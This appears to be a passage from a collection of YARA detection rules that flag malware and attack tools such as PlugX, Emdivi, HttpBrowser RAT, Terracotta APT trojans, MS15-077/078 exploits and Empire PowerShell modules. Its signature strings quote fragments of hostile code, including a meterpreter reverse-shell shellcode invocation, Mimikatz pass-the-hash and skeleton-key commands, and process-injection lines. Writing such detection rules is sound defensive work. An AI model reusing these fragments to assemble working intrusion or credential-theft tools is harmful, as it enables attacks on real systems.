      $x2 = "WoolenLoger\\obj\\x86\\Release" ascii
      $x3 = "D:\\Yaser Logers\\" 
      $z1 = "woolger" fullword wide
      $s1 = "oShellLink.TargetPath = \"" fullword ascii
      $s2 = "wscript.exe " fullword ascii
      $s3 = "strSTUP = WshShell.SpecialFolders(\"Startup\")" fullword ascii
      $s4 = "[CapsLock]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or ( $z1 and 2 of ( $s* ) ) ) ) or ( $z1 and all of ( $s* ) )
} 

rule MAL_Korplug_FAST_RID2CBB : DEMO EXE FILE MAL T1085 T1136 {
   meta:
      description = "Rule to detect Korplug/PlugX FAST variant"
      author = "Florian Roth"
      reference = "-"
      date = "2015-08-20 10:01:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%s\\rundll32.exe \"%s\", ShadowPlay" fullword ascii
      $a1 = "ShadowPlay" fullword ascii
      $s1 = "%s\\rundll32.exe \"%s\"," fullword ascii
      $s2 = "nvdisps.dll" fullword ascii
      $s3 = "%snvdisps.dll" fullword ascii
      $s4 = "\\winhlp32.exe" fullword ascii
      $s5 = "nvdisps_user.dat" fullword ascii
      $s6 = "%snvdisps_user.dat" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( $x1 or ( $a1 and 1 of ( $s* ) ) or 4 of ( $s* ) )
} 

rule MAL_Emdivi_SFX_RID2BF8 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Emdivi malware in SFX Archive"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
      date = "2015-08-20 09:29:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Setup=unsecess.exe" fullword ascii
      $x2 = "Setup=leassnp.exe" fullword ascii
      $s1 = "&Enter password for the encrypted file:" fullword wide
      $s2 = ";The comment below contains SFX script commands" fullword ascii
      $s3 = "Path=%temp%" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 740KB and ( 1 of ( $x* ) and all of ( $s* ) )
} 

rule MAL_Emdivi_Gen3_RID2C54 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Emdivi Malware"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
      date = "2015-08-20 09:44:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)" fullword ascii
      $s2 = "\\Mozilla\\Firefox\\Profiles\\" fullword ascii
      $s4 = "\\auto.cfg" fullword ascii
      $s5 = "/ncsi.txt" fullword ascii
      $s6 = "/en-us/default.aspx" fullword ascii
      $s7 = "cmd /c" fullword ascii
      $s9 = "APPDATA" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 850KB and ( ( $x1 and 1 of ( $s* ) ) or ( 4 of ( $s* ) ) )
} 

rule MAL_Emdivi_Gen4_RID2C55 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Emdivi Malware"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
      date = "2015-08-20 09:44:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".http_port\", " fullword wide
      $s2 = "UserAgent: " fullword ascii
      $s3 = "AUTH FAILED" fullword ascii
      $s4 = "INVALID FILE PATH" fullword ascii
      $s5 = ".autoconfig_url\", \"" fullword wide
      $s6 = "FAILED TO WRITE FILE" fullword ascii
      $s7 = ".proxy" fullword wide
      $s8 = "AuthType: " fullword ascii
      $s9 = ".no_proxies_on\", \"" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 853KB and all of them
} 

rule CheshireCat_Sample2_RID2E47 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/"
      date = "2015-08-08 11:07:41"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "mpgvwr32.dll" fullword ascii
      $s1 = "Unexpected failure of wait! (%d)" fullword ascii
      $s2 = "\"%s\" /e%d /p%s" fullword ascii
      $s4 = "error in params!" fullword ascii
      $s5 = "sscanf" fullword ascii
      $s6 = "<>Param : 0x%x" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 4 of ( $s* )
} 

rule CheshireCat_Gen2_RID2CFF : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/"
      date = "2015-08-08 10:13:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "Interface\\%s\\info" fullword ascii
      $a2 = "Interface\\%s\\info\\%s" fullword ascii
      $a3 = "CLSID\\%s\\info\\%s" fullword ascii
      $a4 = "CLSID\\%s\\info" fullword ascii
      $b1 = "Windows Shell Icon Handler" fullword wide
      $b2 = "Microsoft Shell Icon Handler" fullword wide
      $s1 = "\\StringFileInfo\\%s\\FileVersion" fullword ascii
      $s2 = "CLSID\\%s\\AuxCLSID" fullword ascii
      $s3 = "lnkfile\\shellex\\IconHandler" fullword ascii
      $s4 = "%s: %s, %.2hu %s %hu %2.2hu:%2.2hu:%2.2hu GMT" fullword ascii
      $s5 = "%sMutex" fullword ascii
      $s6 = "\\ShellIconCache" fullword ascii
      $s7 = "+6Service Pack " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 7 of ( $s* ) and 2 of ( $a* ) and 1 of ( $b* )
} 

rule HttpBrowser_RAT_dropper_Gen1_RID31E0 : APT DEMO EXE FILE MAL T1038 T1136 {
   meta:
      description = "Threat Group 3390 APT Sample - HttpBrowser RAT Dropper"
      author = "Florian Roth"
      reference = "http://snip.ly/giNB"
      date = "2015-08-06 13:41:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1038, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "1001=cmd.exe" fullword ascii
      $x2 = "1003=ShellExecuteA" fullword ascii
      $x3 = "1002=/c del /q %s" fullword ascii
      $x4 = "1004=SetThreadPriority" fullword ascii
      $op0 = { e8 71 11 00 00 83 c4 10 ff 4d e4 8b f0 78 07 8b } 
      $op1 = { e8 85 34 00 00 59 59 8b 86 b4 } 
      $op2 = { 8b 45 0c 83 38 00 0f 84 97 } 
      $op3 = { 8b 45 0c 83 38 00 0f 84 98 } 
      $op4 = { 89 7e 0c ff 15 a0 50 40 00 59 8b d8 6a 20 59 8d } 
      $op5 = { 56 8d 85 cd fc ff ff 53 50 88 9d cc fc ff ff e8 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of ( $x* ) and 1 of ( $op* )
} 

rule HttpBrowser_RAT_Sample1_RID2FCD : APT DEMO EXE FILE MAL T1038 T1136 {
   meta:
      description = "Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com"
      author = "Florian Roth"
      reference = "http://snip.ly/giNB"
      date = "2015-08-06 12:12:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1038, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "update.hancominc.com" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $s0
} 

rule HttpBrowser_RAT_Sample2_RID2FCE : APT DEMO EXE FILE MAL T1038 T1136 {
   meta:
      description = "Threat Group 3390 APT Sample - HttpBrowser RAT Sample"
      author = "Florian Roth"
      reference = "http://snip.ly/giNB"
      date = "2015-08-06 12:12:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1038, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "nKERNEL32.DLL" fullword wide
      $s1 = "WUSER32.DLL" fullword wide
      $s2 = "mscoree.dll" fullword wide
      $s3 = "VPDN_LU.exeUT" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them
} 

rule HttpBrowser_RAT_Gen_RID2E54 : APT DEMO EXE FILE GEN MAL T1038 T1136 {
   meta:
      description = "Threat Group 3390 APT Sample - HttpBrowser RAT Generic"
      author = "Florian Roth"
      reference = "http://snip.ly/giNB"
      date = "2015-08-06 11:09:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, MAL, T1038, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%d|%s|%04d/%02d/%02d %02d:%02d:%02d|%ld|%d" fullword wide
      $s1 = "HttpBrowser/1.0" fullword wide
      $s2 = "set cmd : %s" ascii fullword
      $s3 = "\\config.ini" wide fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and filesize > 20KB and all of them
} 

rule PlugX_NvSmartMax_Gen_RID2ECA : APT DEMO EXE FILE GEN T1136 {
   meta:
      description = "Threat Group 3390 APT Sample - PlugX NvSmartMax Generic"
      author = "Florian Roth"
      reference = "http://snip.ly/giNB"
      date = "2015-08-06 11:29:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "NvSmartMax.dll" fullword ascii
      $s1 = "NvSmartMax.dll.url" fullword ascii
      $s2 = "Nv.exe" fullword ascii
      $s4 = "CryptProtectMemory failed" fullword ascii
      $s5 = "CryptUnprotectMemory failed" fullword ascii
      $s7 = "r%.*s(%d)%s" fullword wide
      $s8 = " %s CRC " fullword wide
      $op0 = { c6 05 26 49 42 00 01 eb 4a 8d 85 00 f8 ff ff 50 } 
      $op1 = { 8d 85 c8 fe ff ff 50 8d 45 c8 50 c6 45 47 00 e8 } 
      $op2 = { e8 e6 65 00 00 50 68 10 43 41 00 e8 56 84 00 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of ( $s* ) and 1 of ( $op* )
} 

rule HttpBrowser_RAT_dropper_Gen2_RID31E1 : APT DEMO EXE FILE MAL T1038 T1136 {
   meta:
      description = "Threat Group 3390 APT Sample - HttpBrowser RAT Dropper"
      author = "Florian Roth"
      reference = "http://snip.ly/giNB"
      date = "2015-08-06 13:41:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1038, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "navlu.dll.urlUT" fullword ascii
      $s2 = "VPDN_LU.exeUT" fullword ascii
      $s3 = "pnipcn.dllUT" fullword ascii
      $s4 = "\\ssonsvr.exe" fullword ascii
      $s5 = "/c del /q %s" fullword ascii
      $s6 = "\\setup.exe" fullword ascii
      $s7 = "msi.dllUT" fullword ascii
      $op0 = { 8b 45 0c 83 38 00 0f 84 98 } 
      $op1 = { e8 dd 07 00 00 ff 35 d8 fb 40 00 8b 35 7c a0 40 } 
      $op2 = { 83 fb 08 75 2c 8b 0d f8 af 40 00 89 4d dc 8b 0d } 
      $op3 = { c7 43 18 8c 69 40 00 e9 da 01 00 00 83 7d f0 00 } 
      $op4 = { 6a 01 e9 7c f8 ff ff bf 1a 40 00 96 1b 40 00 01 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of ( $s* ) and 1 of ( $op* )
} 

rule Empire_Invoke_BypassUAC_RID2FE8 : DEMO SUSP T1086 T1088 T1136 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-BypassUAC.ps1"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 12:17:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1086, T1088, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii
      $s2 = "$proc = Start-Process -WindowStyle Hidden notepad.exe -PassThru" fullword ascii
      $s3 = "$Payload = Invoke-PatchDll -DllBytes $Payload -FindString \"ExitThread\" -ReplaceString \"ExitProcess\"" fullword ascii
      $s4 = "$temp = [System.Text.Encoding]::UNICODE.GetBytes($szTempDllPath)" fullword ascii
   condition: 
      filesize < 1200KB and 3 of them
} 

rule Empire_lib_modules_trollsploit_message_RID36CC : DEMO SUSP T1086 T1136 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file message.py"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 17:11:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "script += \" -\" + str(option) + \" \\\"\" + str(values['Value'].strip(\"\\\"\")) + \"\\\"\"" fullword ascii
      $s2 = "if option.lower() != \"agent\" and option.lower() != \"computername\":" fullword ascii
      $s3 = "[String] $Title = 'ERROR - 0xA801B720'" fullword ascii
      $s4 = "'Value'         :   'Lost contact with the Domain Controller.'" fullword ascii
   condition: 
      filesize < 10KB and 3 of them
} 

rule Empire_Persistence_RID2E57 : DEMO SUSP T1086 T1136 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file Persistence.psm1"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 11:10:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -V" ascii
      $s2 = "# Execute the following to remove the user-level persistent payload" fullword ascii
      $s3 = "$PersistantScript = $PersistantScript.ToString().Replace('EXECUTEFUNCTION', \"$PersistenceScriptName -Persist\")" fullword ascii
   condition: 
      filesize < 108KB and 1 of them
} 

rule Empire_portscan_RID2D3C : DEMO SUSP T1086 T1136 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file portscan.py"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 10:23:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "script += \"Invoke-PortScan -noProgressMeter -f\"" fullword ascii
      $s2 = "script += \" | ? {$_.alive}| Select-Object HostName,@{name='OpenPorts';expression={$_.openPorts -join ','}} | ft -wrap | Out-Str" ascii
   condition: 
      filesize < 14KB and all of them
} 

rule Empire_Invoke_Shellcode_RID3030 : DEMO SUSP T1086 T1136 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 12:29:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos" ascii
      $s2 = "\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\" ) )" fullword ascii
      $s3 = "$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)" fullword ascii
   condition: 
      filesize < 100KB and 1 of them
} 

rule Empire_Invoke_Mimikatz_1_RID3073 : DEMO S0002 SUSP T1003 T1075 T1086 T1097 T1136 T1178 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Mimikatz.ps1"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 12:40:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, S0002, SUSP, T1003, T1075, T1086, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$PEBytes64 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwc" ascii
      $s2 = "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)" fullword ascii
      $s3 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii
   condition: 
      filesize < 2500KB and 2 of them
} 

rule Empire_lib_modules_credentials_mimikatz_pth_RID38BE : DEMO S0002 SUSP T1003 T1075 T1086 T1097 T1136 T1178 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file pth.py"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 18:34:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, S0002, SUSP, T1003, T1075, T1086, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]" fullword ascii
      $s1 = "command = \"sekurlsa::pth /user:\"+self.options[\"user\"]['Value']" fullword ascii
   condition: 
      filesize < 12KB and all of them
} 

rule Empire_Write_HijackDll_RID2FA2 : DEMO SUSP T1086 T1136 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file Write-HijackDll.ps1"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 12:05:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString \"debug.bat\" -ReplaceString $BatchPath" fullword ascii
      $s2 = "$DllBytes32 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBw" ascii
      $s3 = "[Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)" fullword ascii
   condition: 
      filesize < 500KB and 2 of them
} 

rule Empire_skeleton_key_RID2EDF : DEMO SUSP T1086 T1098 T1136 T1177 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file skeleton_key.py"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 11:33:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1086, T1098, T1136, T1177"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "script += \"Invoke-Mimikatz -Command '\\\"\" + command + \"\\\"';\"" fullword ascii
      $s2 = "script += '\"Skeleton key implanted. Use password \\'mimikatz\\' for access.\"'" fullword ascii
      $s3 = "command = \"misc::skeleton\"" fullword ascii
      $s4 = "\"ONLY APPLICABLE ON DOMAIN CONTROLLERS!\")," fullword ascii
   condition: 
      filesize < 6KB and 2 of them
} 

rule Empire_invoke_wmi_RID2E0A : DEMO SUSP T1086 T1136 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file invoke_wmi.py"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 10:57:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]" fullword ascii
      $s2 = "script += \";'Invoke-Wmi executed on \" +computerNames +\"'\"" fullword ascii
      $s3 = "script = \"$PSPassword = \\\"\"+password+\"\\\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Man" ascii
   condition: 
      filesize < 20KB and 2 of them
} 

rule Apolmy_Privesc_Trojan_RID2F8B : APT DEMO EXE FILE MAL T1068 T1136 {
   meta:
      description = "Apolmy Privilege Escalation Trojan used in APT Terracotta"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
      date = "2015-08-04 12:01:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1068, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[%d] Failed, %08X" fullword ascii
      $s2 = "[%d] Offset can not fetched." fullword ascii
      $s3 = "PowerShadow2011" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule Mithozhan_Trojan_RID2D90 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Mitozhan Trojan used in APT Terracotta"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
      date = "2015-08-04 10:37:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "adbrowser" fullword wide
      $s2 = "IJKLlGdmaWhram0vn36BgIOChYR3L45xcHNydXQvhmloa2ptbH8voYCDTw==" fullword ascii
      $s3 = "EFGHlGdmaWhrL41sf36BgIOCL6R3dk8=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule RemoteExec_Tool_RID2CFF : APT DEMO EXE FILE T1136 {
   meta:
      description = "Remote Access Tool used in APT Terracotta"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
      date = "2015-08-04 10:13:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cmd.exe /q /c \"%s\"" fullword ascii
      $s1 = "\\\\.\\pipe\\%s%s%d" fullword ascii
      $s2 = "This is a service executable! Couldn't start directly." fullword ascii
      $s3 = "\\\\.\\pipe\\TermHlp_communicaton" fullword ascii
      $s4 = "TermHlp_stdout" fullword ascii
      $s5 = "TermHlp_stdin" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 75KB and 4 of ( $s* )
} 

rule LiuDoor_Malware_1_RID2D87 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Liudoor Trojan used in Terracotta APT"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
      date = "2015-08-04 10:35:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "svchostdllserver.dll" fullword ascii
      $s2 = "SvcHostDLL: RegisterServiceCtrlHandler %S failed" fullword ascii
      $s3 = "\\nbtstat.exe" fullword ascii
      $s4 = "DataVersionEx" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them
} 

rule LiuDoor_Malware_2_RID2D88 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Liudoor Trojan used in Terracotta APT"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
      date = "2015-08-04 10:35:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "svchostdllserver.dll" fullword ascii
      $s1 = "Lpykh~mzCCRv|mplpykCCHvq{phlCC\\jmmzqkIzmlvpqCC" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule MAL_MiniDionis_VBS_Dropped_RID30B4 : DEMO MAL SCRIPT T1136 {
   meta:
      description = "Dropped File - 1.vbs"
      author = "Florian Roth"
      reference = "https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/"
      date = "2015-07-21 12:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, SCRIPT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Wscript.Sleep 5000" ascii
      $s2 = "Set FSO = CreateObject(\"Scripting.FileSystemObject\")" ascii
      $s3 = "Set WshShell = CreateObject(\"WScript.Shell\")" ascii
      $s4 = "If(FSO.FileExists(\"" ascii
      $s5 = "then FSO.DeleteFile(\".\\" ascii
   condition: 
      filesize < 1KB and all of them and $s1 in ( 0 .. 40 )
} 

rule Exploit_MS15_077_078_RID2D56 : DEMO EXE EXPLOIT FILE T1136 T1189 {
   meta:
      description = "MS15-078 / MS15-077 exploit - generic signature"
      author = "Florian Roth"
      reference = "https://code.google.com/p/google-security-research/issues/detail?id=473&can=1&start=200"
      date = "2015-07-21 10:27:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, EXPLOIT, FILE, T1136, T1189"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GDI32.DLL" fullword ascii
      $s2 = "atmfd.dll" fullword wide
      $s3 = "AddFontMemResourceEx" fullword ascii
      $s4 = "NamedEscape" fullword ascii
      $s5 = "CreateBitmap" fullword ascii
      $s6 = "DeleteObject" fullword ascii
      $op0 = { 83 45 e8 01 eb 07 c7 45 e8 } 
      $op1 = { 8d 85 24 42 fb ff 89 04 24 e8 80 22 00 00 c7 45 } 
      $op2 = { eb 54 8b 15 6c 00 4c 00 8d 85 24 42 fb ff 89 44 } 
      $op3 = { 64 00 88 ff 84 03 70 03 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 5 of ( $s* ) or 3 of ( $op* )
} 

rule Exploit_MS15_077_078_HackingTeam_RID31F1 : DEMO EXE EXPLOIT FILE T1136 T1189 {
   meta:
      description = "MS15-078 / MS15-077 exploit - Hacking Team code"
      author = "Florian Roth"
      reference = "-"
      date = "2015-07-21 13:44:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, EXPLOIT, FILE, T1136, T1189"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\SystemRoot\\system32\\CI.dll" fullword ascii
      $s2 = "\\sysnative\\CI.dll" fullword ascii
      $s3 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" fullword ascii
      $s4 = "CRTDLL.DLL" fullword ascii
      $s5 = "\\sysnative" fullword ascii
      $s6 = "InternetOpenA coolio, trying open %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 5 of them
} 

rule MAL_Malicious_SFX1_Voicemail_RID3169 : DEMO FILE MAL T1136 {
   meta:
      description = "SFX with voicemail content"
      author = "Florian Roth"
      reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
      date = "2015-07-20 13:21:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
